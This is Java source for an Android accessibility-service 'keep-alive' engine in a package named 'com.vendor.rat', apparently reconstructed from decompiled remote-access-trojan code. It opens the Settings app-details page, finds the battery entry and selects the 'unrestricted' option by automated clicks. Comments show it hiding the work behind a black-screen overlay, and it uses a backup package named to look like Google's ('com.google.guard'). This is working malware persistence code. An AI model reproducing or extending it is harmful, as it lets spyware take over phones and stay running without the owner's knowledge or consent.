package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * AOSP 通用保活引擎 (三星等原生 Android 设备也使用此引擎)
 *
 * 基于逆向: o/g.java (316行) — 所有厂商引擎中最简单
 *
 * 2-state 状态机:
 *   1. App详情 → 查找电池/电源/耗电入口
 *   2. 耗电管理 → 操作"不受限"选项
 *
 * 仅覆盖 1 个目标包名: com.android.settings
 */
public class AospKeepAliveEngine extends AutoEngine {

    private static final String TAG = "AospKeepAlive";

    // ====== 包名 ======
    private static final String SETTINGS = "com.android.settings";

    // ====== Activity — 对齐 vendor o/g.java ======
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String SPA_ACTIVITY =
        "com.android.settings.spa.SpaActivity";
    private static final String SUB_SETTINGS =
        "com.android.settings.SubSettings";

    // ====== 保活类型 — 对应 vendor r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
    private static final String BACKUP_APP = "com.google.guard";

    // ====== State 常量 — 对应 vendor stateQueue ======
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_APP_BATTERY = "keepAliveInAppBattery";

    // ====== 字段 — 对应 vendor f637r~f640u (4个, 最少) ======
    private final AtomicReference<String> keepAliveType =
        new AtomicReference<>(KA_UNKNOWN);                                // f637r
    private final AtomicBoolean allowFullBackground = new AtomicBoolean(false);  // f638s
    private final AtomicBoolean allowAutoStart = new AtomicBoolean(false);       // f639t
    private final AtomicBoolean allowRelateStart = new AtomicBoolean(false);     // f640u

    private String appName;

    // ====== 窗口检测分组 ======
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> batteryWins = new ArrayList<>();

    // ====== 构造函数 — 对应 vendor 行 40-51 ======
    public AospKeepAliveEngine() {
        super(buildWindowMatchers(), SETTINGS);
        buildDetectionGroups();
        try {
            // vendor: schedule(f(this, 2), 30L, SECONDS) — 30秒超时
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { finish(); }
            }, 30L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    private void buildDetectionGroups() {
        // i0() — App详情: InstalledAppDetailsTop / SpaActivity / FrameLayout
        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        appDetailWins.add(new WindowMatcher(SETTINGS, SPA_ACTIVITY)
            .addEventType(32).addEventType(16384));
        appDetailWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // h0() — 耗电管理: SubSettings
        batteryWins.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)
            .addEventType(32).addEventType(16384));
    }

    // ====== buildWindowMatchers — 对应 vendor k0() 行 118-129, 8个 ======
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // 0: c.J() — 电池优化对话框
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));
        // 1: e0(主包名) — 应用详情
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // 2: e0(备包名) — 应用详情
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // 3: m0(主包名) — SpaActivity (Android 13+)
        list.add(new WindowMatcher(SETTINGS, SPA_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 4: m0(备包名) — SpaActivity
        list.add(new WindowMatcher(SETTINGS, SPA_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 5: j0(主包名) — FrameLayout
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // 6: j0(备包名) — FrameLayout
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // 7: d0() — SubSettings
        list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)
            .addEventType(32).addEventType(16384));
        return list;
    }

    // ====== 窗口检测 — 对应 vendor i0/h0 ======

    /** vendor i0() 行 226-242: App详情窗口 */
    private boolean i0() { return matchesAny(appDetailWins); }

    /** vendor h0() 行 213-224: 耗电管理窗口 (SubSettings) */
    private boolean h0() { return matchesAny(batteryWins); }

    // ====== 抽象方法实现 ======

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // vendor 不使用回调模式
    }

    @Override
    public void execute() {
        // vendor: 外部启动应用详情页
        startSilent(SETTINGS, INSTALLED_APP_DETAILS);
    }

    // ====== 事件处理 — 对应 vendor u() 行 285-316 ======

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        // vendor u():291-292 — super.u() 电池优化对话框
        if (event != null) {
            checkBatteryOptimizationDialog();
        }

        // [1] i0() → App详情
        if (i0()) {
            dispatchState(ST_APP_DETAIL, this::handleAppDetail, ST_APP_BATTERY);
        }
        // [2] h0() → 耗电管理
        if (h0()) {
            dispatchState(ST_APP_BATTERY, this::handleAppBattery, ST_APP_DETAIL);
        }
    }

    // ====== 任务处理 — 对应 vendor f(case) ======

    /**
     * case 0: App详情页 — 查找电池/电源/耗电入口→点击
     * vendor: f(this, 0) — 使用 c0()/f0()/g0() 3个 filter 依次查找
     */
    private void handleAppDetail() {
        if (!i0()) return;
        updateProgress(10);
        activateRoot();
        UiNode root = k();
        if (root == null) return;

        // vendor c0(): COMMON_SETTINGS_BATTERY_TEXT — "电池"
        UiNode target = root.findOneByCombine(buildBatteryFilter());
        // vendor f0(): COMMON_SETTINGS_POWER_TEXT — "电源"
        if (target == null) {
            target = root.findOneByCombine(buildPowerFilter());
        }
        // vendor g0(): COMMON_SETTINGS_USE_POWER_TEXT — "耗电"
        if (target == null) {
            target = root.findOneByCombine(buildUsePowerFilter());
        }

        if (target != null) {
            Log.d(TAG, "电池/电源/耗电栏目查找成功");
            UiNode clickable = target.findClickableParent();
            if (clickable != null && clickable.click()) {
                Log.d(TAG, "已点击电池栏目");
                updateProgress(30);
            }
        } else {
            Log.e(TAG, "电池/电源/耗电栏目查找失败");
        }
    }

    /**
     * case 1: 耗电管理页 — 查找"不受限"并选中
     * vendor: f(this, 1) — 调用 l0(root)
     *
     * l0() 反编译失败 (252 条指令), 从上下文重建:
     * 与传音 o0() (254 条) 几乎相同, 共享 COMMON_* Key
     */
    private void handleAppBattery() {
        if (!h0()) return;
        updateProgress(40);
        activateRoot();
        UiNode root = k();
        if (root == null) return;

        UiNode target = performBatteryOptimization(root);
        if (target != null) {
            allowFullBackground.set(true);
            Log.d(TAG, "电池优化操作完成");
            updateProgress(60);
        } else {
            Log.e(TAG, "不受限选项查找失败");
        }
    }

    /**
     * 重建 vendor l0(UiObject) — 反编译失败 (252 条指令)
     * 与传音 o0() 逻辑一致:
     * 1. o0() OR filter 查找 不受限/无限制/已取消限制
     * 2. fallback: b0() 查找 允许后台使用
     * 3. scrollView 中查找 → R() 坐标点击
     */
    private UiNode performBatteryOptimization(UiNode root) {
        try {
            UiNode scrollView = getScrollableNode();
            UiNode target = null;

            CombineFilter unrestrictedFilter = buildUnrestrictedFilter();

            if (scrollView != null) {
                target = scrollView.scrollForwardUntil(unrestrictedFilter);
                if (target == null) {
                    target = scrollView.scrollBackwardUntil(unrestrictedFilter);
                }
            }
            if (target == null) {
                target = root.findOneByCombine(unrestrictedFilter);
            }
            // fallback: 允许后台使用
            if (target == null) {
                CombineFilter allowBg = buildAllowBackgroundFilter();
                if (scrollView != null) {
                    target = scrollView.scrollForwardUntil(allowBg);
                }
                if (target == null) {
                    target = root.findOneByCombine(allowBg);
                }
            }

            if (target != null) {
                Log.d(TAG, "不受限选项查找成功: " + target);
                UiNode clickable = target.findClickableParent();
                if (clickable != null) {
                    CheckedResult result = R(clickable, 3);
                    if (result.isClicked() || result.isChecked()) {
                        Log.d(TAG, "已选中不受限选项");
                        return target;
                    }
                }
                if (target.click()) {
                    Log.d(TAG, "已点击不受限选项");
                    return target;
                }
            }
        } catch (Exception e) {
            logError("performBatteryOptimization", e);
        }
        return null;
    }

    // ====== 状态持久化 — 对应 vendor n0(String) 行 260-283 ======

    private void saveState(String packageName) {
        try {
            Log.d(TAG, "已保存本地保活策略|" + packageName
                + " fullBg=" + allowFullBackground.get()
                + " autoStart=" + allowAutoStart.get()
                + " relateStart=" + allowRelateStart.get());
        } catch (Exception e) {
            logError("saveState", e);
        }
    }

    // ====== finish — 对应 vendor Z() 行 176-211 ======

    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!T()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    // vendor Z():183 — X() 先于 h(100)
                    X();
                    updateProgress(100);
                    if (MyAccessibilityService.getInstance() != null) {
                        MyAccessibilityService.getInstance().H(true, true);
                    }
                    // vendor Z():188-194 — 保存状态
                    if (KA_MAIN.equals(keepAliveType.get())) {
                        saveState(getAppName());
                    }
                    if (KA_BACKUP.equals(keepAliveType.get())) {
                        saveState(BACKUP_APP);
                    }
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    // vendor Z():198-201 — 等待+移除遮罩 (无PIP判断)
                    T0(5);
                    removeBlackScreen();
                    Log.d(TAG, "已结束本地保活自动化引擎");
                    // vendor Z():203 — c.W() 通知策略
                    if (MainApplication.getInstance() != null) {
                        MainApplication.getInstance()
                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                    }
                }
            } catch (Exception e) {
                logError("finish", e);
            } finally {
                lock.unlock();
            }
        }
        super.finish();
    }

    // ====== CombineFilter — 对应 vendor b0/c0/f0/g0/o0 ======

    /** vendor c0() 行 63-72: COMMON_SETTINGS_BATTERY_TEXT */
    private static CombineFilter buildBatteryFilter() {
        return CombineFilter.textView("电池");
    }

    /** vendor f0() 行 88-97: COMMON_SETTINGS_POWER_TEXT */
    private static CombineFilter buildPowerFilter() {
        return CombineFilter.textView("电源");
    }

    /** vendor g0() 行 99-108: COMMON_SETTINGS_USE_POWER_TEXT */
    private static CombineFilter buildUsePowerFilter() {
        return CombineFilter.textView("耗电");
    }

    /** vendor b0() 行 53-61: COMMON_ALLOW_BACKGROUND_USAGE_TEXT */
    private static CombineFilter buildAllowBackgroundFilter() {
        return CombineFilter.textView("允许后台使用");
    }

    /**
     * vendor o0() 行 139-174: OR(不受限/无限制/已取消限制)
     * 与传音 q0() 完全相同
     */
    private static CombineFilter buildUnrestrictedFilter() {
        return CombineFilter.or(
            CombineFilter.textView("不受限"),
            CombineFilter.textView("无限制"),
            CombineFilter.textView("已取消限制")
        );
    }

    // ====== 工具方法 ======

    private String getAppName() {
        return appName != null ? appName : "com.vendor.rat";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    // ====== equals/hashCode ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof AospKeepAliveEngine;
    }

    @Override
    public int hashCode() {
        return Objects.hash(AospKeepAliveEngine.class.getName());
    }
}
